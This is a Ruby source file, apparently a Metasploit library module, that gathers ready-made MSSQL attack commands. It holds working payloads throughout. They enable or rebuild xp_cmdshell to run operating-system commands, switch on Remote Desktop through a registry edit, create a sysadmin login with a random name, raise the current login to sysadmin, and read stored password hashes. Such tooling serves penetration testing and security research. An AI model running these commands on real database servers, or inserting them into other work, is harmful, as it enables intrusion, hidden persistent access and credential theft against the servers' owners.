# -*- coding: binary -*-
module Msf

###
#
# This module provides MSSQL specific commands in a centralized manner.
#
###

module Exploit::Remote::MSSQL_COMMANDS

  # Re-enable the xp_cmdshell stored procedure in 2005 and 2008
  def mssql_xpcmdshell_enable(opts={})
    "exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;"
  end

  # Re-enable the xp_cmdshell stored procedure on 2000
  def mssql_xpcmdshell_enable_2000(opts={})
    "exec sp_addextendedproc 'xp_cmdshell','xp_log70.dll';exec sp_addextendedproc 'xp_cmdshell', 'C:\\Program Files\\Microsoft SQL Server\\MSSQL\\Binn\\xplog70.dll';"
  end

  # Disable the xp_cmdshell stored procedure on 2005 and 2008
  def mssql_xpcmdshell_disable(opts={})
    "exec sp_configure 'xp_cmdshell', 0 ;RECONFIGURE;exec sp_configure 'show advanced options', 0 ;RECONFIGURE;"
  end

  # Disable the xp_cmdshell stored procedure in 2000
  def mssql_sql_xpcmdshell_disable_2000(opts={})
    "exec sp_dropextendedproc 'xp_cmdshell';"
  end

  # Rebuild xp_cmdshell if it was deleted
  def mssql_rebuild_xpcmdshell(opts={})
    "CREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int = 0) AS;DECLARE @result int, @OLEResult int, @RunResult int;DECLARE @ShellID int;EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID OUT;IF @OLEResult <> 0 SELECT @result = @OLEResult;IF @OLEResult <> 0 RAISERROR ('CreateObject %0X', 14, 1, @OLEResult);EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, @cmd, 0, @Wait;IF @OLEResult <> 0 SELECT @result = @OLEResult;IF @OLEResult <> 0 RAISERROR ('Run %0X', 14, 1, @OLEResult);EXECUTE @OLEResult = sp_OADestroy @ShellID;return @result;"
  end

  # Turn on RDP
  def mssql_rdp_enable(opts={})
    "exec master..xp_cmdshell 'REG ADD 'HKLM\\SYSTEM\\CurrentControlSet\\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /f /d 0';"
  end

  # Grab servername
  def mssql_enumerate_servername(opts={})
    "SELECT @@SERVERNAME"
  end

  # Get SQL Server Version Info
  def mssql_sql_info(opts={})
    "SELECT @@VERSION"
  end

  # Add random user and random password to "sa" role on MSSQL
  def mssql_sa_escalation(opts={})
    var_username = opts[:username] || rand_text_alpha(5)
    var_password = opts[:password] || rand_text_alpha(10)
    "exec sp_addlogin '#{var_username}', '#{var_password}';exec sp_addsrvrolemember '#{var_username}', 'sysadmin'"
  end

  # Add SQL current user to sysadmin group
  def mssql_current_user_escalation(opts={})
    "declare @moo varchar(50); set @moo = (select SYSTEM_USER); exec master..sp_addsrvrolemember @moo, 'sysadmin'"
  end

  def mssql_2k5_password_hashes(opts={})
    "SELECT name, password_hash FROM master.sys.sql_logins"
  end

  def mssql_2k_password_hashes(opts={})
    "SELECT name, password FROM master..sysxlogins"
  end

  def mssql_is_sysadmin(opts={})
    "SELECT is_srvrolemember('sysadmin')"
  end

  def mssql_db_names(opts={})
    "SELECT name FROM master..sysdatabases"
  end

end
end
